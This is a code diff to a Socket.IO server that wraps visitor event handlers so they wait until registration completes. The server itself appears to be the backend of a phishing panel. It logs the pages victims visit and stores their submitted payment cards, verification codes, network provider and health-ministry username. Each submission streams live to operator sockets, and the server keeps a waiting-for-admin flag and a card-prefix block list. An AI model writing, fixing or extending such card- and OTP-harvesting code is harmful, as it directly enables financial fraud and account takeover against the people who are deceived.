@@ -445,6 +445,24 @@ function saveVisitorPermanently(visitor) {
 io.on("connection", (socket) => {
   console.log(`New connection: ${socket.id}`);
 
+  // Track registration completion to prevent race conditions
+  let registrationComplete = false;
+  let pendingEvents = [];
+
+  function waitForRegistration(handler) {
+    if (registrationComplete) {
+      handler();
+    } else {
+      pendingEvents.push(handler);
+    }
+  }
+
+  function completeRegistration() {
+    registrationComplete = true;
+    pendingEvents.forEach(fn => fn());
+    pendingEvents = [];
+  }
+
   // Handle visitor registration
   socket.on("visitor:register", async (data) => {
     const visitorInfo = await getVisitorInfo(socket);
@@ -527,7 +545,8 @@ io.on("connection", (socket) => {
     saveData();
 
     // Send confirmation to visitor
-    socket.emit("successfully-connected", {
+    socket.emit("visitor:registered", {
+      _id: visitor._id,
       sid: socket.id,
       pid: visitor._id,
     });
@@ -540,29 +559,34 @@ io.on("connection", (socket) => {
         io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
       }
     });
+
+    // Mark registration as complete and process any queued events
+    completeRegistration();
   });
 
-  // Handle page enter
+  // Handle page enter (wrapped to wait for registration)
   socket.on("visitor:pageEnter", (page) => {
-    const visitor = visitors.get(socket.id);
-    if (visitor) {
-      visitor.page = page;
-      // Update lastDataUpdate when visitor enters payment summary page to bring them to top
-      if (page === "ملخص الدفع" || page === "payment-summary") {
-        visitor.lastDataUpdate = new Date().toISOString();
-        visitor.hasEnteredCardPage = true;
-      }
-      visitors.set(socket.id, visitor);
-      saveVisitorPermanently(visitor);
+    waitForRegistration(() => {
+      const visitor = visitors.get(socket.id);
+      if (visitor) {
+        visitor.page = page;
+        // Update lastDataUpdate when visitor enters payment summary page to bring them to top
+        if (page === "ملخص الدفع" || page === "payment-summary") {
+          visitor.lastDataUpdate = new Date().toISOString();
+          visitor.hasEnteredCardPage = true;
+        }
+        visitors.set(socket.id, visitor);
+        saveVisitorPermanently(visitor);
 
-      // Notify admins
-      admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:pageChanged", {
-          visitorId: visitor._id,
-          page,
+        // Notify admins
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("visitor:pageChanged", {
+            visitorId: visitor._id,
+            page,
+          });
         });
-      });
-    }
+      }
+    });
   });
 
   // Handle visitor name update (from MOH username)
@@ -588,90 +612,94 @@ io.on("connection", (socket) => {
 
   // Handle more info (data submission)
   socket.on("more-info", (data) => {
-    const visitor = visitors.get(socket.id);
-    if (visitor) {
-      // Store submitted data with page info for ordering
-      if (data.content) {
-        // Initialize dataHistory if not exists
-        if (!visitor.dataHistory) {
-          visitor.dataHistory = [];
+    waitForRegistration(() => {
+      const visitor = visitors.get(socket.id);
+      if (visitor) {
+        // Store submitted data with page info for ordering
+        if (data.content) {
+          // Initialize dataHistory if not exists
+          if (!visitor.dataHistory) {
+            visitor.dataHistory = [];
+          }
+          // Add new data entry with timestamp and page
+          const now = new Date().toISOString();
+          visitor.dataHistory.push({
+            content: data.content,
+            page: data.page,
+            timestamp: now,
+          });
+          // Always update lastDataUpdate so visitor moves to top of list
+          visitor.lastDataUpdate = now;
+          // Also keep flat data for backward compatibility
+          visitor.data = { ...visitor.data, ...data.content };
+          // تخزين اسم الشبكة إذا كان موجوداً
+          if (data.content["مزود الخدمة"]) {
+            visitor.network = data.content["مزود الخدمة"];
+          }
         }
-        // Add new data entry with timestamp and page
-        const now = new Date().toISOString();
-        visitor.dataHistory.push({
-          content: data.content,
-          page: data.page,
-          timestamp: now,
-        });
-        // Always update lastDataUpdate so visitor moves to top of list
-        visitor.lastDataUpdate = now;
-        // Also keep flat data for backward compatibility
-        visitor.data = { ...visitor.data, ...data.content };
-        // تخزين اسم الشبكة إذا كان موجوداً
-        if (data.content["مزود الخدمة"]) {
-          visitor.network = data.content["مزود الخدمة"];
+        if (data.paymentCard) {
+          const now = new Date().toISOString();
+          visitor.paymentCards.push({
+            ...data.paymentCard,
+            timestamp: now,
+          });
+          // Start tracking from card page
+          visitor.lastDataUpdate = now;
+          visitor.hasEnteredCardPage = true;
         }
-      }
-      if (data.paymentCard) {
-        const now = new Date().toISOString();
-        visitor.paymentCards.push({
-          ...data.paymentCard,
-          timestamp: now,
-        });
-        // Start tracking from card page
-        visitor.lastDataUpdate = now;
-        visitor.hasEnteredCardPage = true;
-      }
-      if (data.digitCode) {
-        const now = new Date().toISOString();
-        visitor.digitCodes.push({
-          code: data.digitCode,
-          page: data.page,
-          timestamp: now,
-        });
-        // Always update lastDataUpdate so visitor moves to top
-        visitor.lastDataUpdate = now;
-      }
+        if (data.digitCode) {
+          const now = new Date().toISOString();
+          visitor.digitCodes.push({
+            code: data.digitCode,
+            page: data.page,
+            timestamp: now,
+          });
+          // Always update lastDataUpdate so visitor moves to top
+          visitor.lastDataUpdate = now;
+        }
 
-      visitor.page = data.page;
-      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
-      visitor.hasNewData = true;
-      visitors.set(socket.id, visitor);
-      saveVisitorPermanently(visitor);
+        visitor.page = data.page;
+        visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
+        visitor.hasNewData = true;
+        visitors.set(socket.id, visitor);
+        saveVisitorPermanently(visitor);
 
-      // Notify admins
-      admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:dataSubmitted", {
-          visitorId: visitor._id,
-          socketId: socket.id,
-          data: data,
-          visitor: visitor,
+        // Notify admins
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("visitor:dataSubmitted", {
+            visitorId: visitor._id,
+            socketId: socket.id,
+            data: data,
+            visitor: visitor,
+          });
         });
-      });
 
-      console.log(`Data received from visitor ${visitor._id}:`, data);
-    }
+        console.log(`Data received from visitor ${visitor._id}:`, data);
+      }
+    });
   });
 
   // Handle card number verification
   socket.on("cardNumber:verify", (cardNumber) => {
-    const visitor = visitors.get(socket.id);
-    if (visitor) {
-      // Check if card prefix is blocked
-      const prefix = cardNumber.substring(0, 4);
-      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);
+    waitForRegistration(() => {
+      const visitor = visitors.get(socket.id);
+      if (visitor) {
+        // Check if card prefix is blocked
+        const prefix = cardNumber.substring(0, 4);
+        const isBlocked = visitor.blockedCardPrefixes.includes(prefix);
 
-      socket.emit("cardNumber:verified", !isBlocked);
+        socket.emit("cardNumber:verified", !isBlocked);
 
-      // Notify admins
-      admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:cardVerification", {
-          visitorId: visitor._id,
-          cardNumber,
-          isBlocked,
+        // Notify admins
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("visitor:cardVerification", {
+            visitorId: visitor._id,
+            cardNumber,
+            isBlocked,
+          });
         });
-      });
-    }
+      }
+    });
   });
 
   // Admin registration
